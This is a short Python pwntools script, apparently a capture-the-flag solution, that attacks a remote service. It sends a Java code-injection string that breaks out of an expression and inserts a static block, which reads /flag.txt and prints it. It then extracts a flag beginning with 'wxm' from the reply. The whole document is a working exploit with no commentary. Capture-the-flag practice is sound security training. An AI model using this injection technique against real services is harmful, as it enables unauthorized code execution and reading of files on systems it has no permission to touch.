inp = '1);} static { try { System.out.println(new java.io.BufferedReader(new java.io.FileReader("/flag.txt")).readLine()); } catch (Exception e) {e.printStackTrace();} int x = (4'

from pwn import *
import sys

s = remote(sys.argv[1], int(sys.argv[2]))
context.encoding = 'utf-8'
s.recvuntil("string: ")
s.sendline(inp)
s.recvuntil("wxm")
flag = "wxm" + s.recvuntil("}").decode("utf-8") + "}"
info(flag)
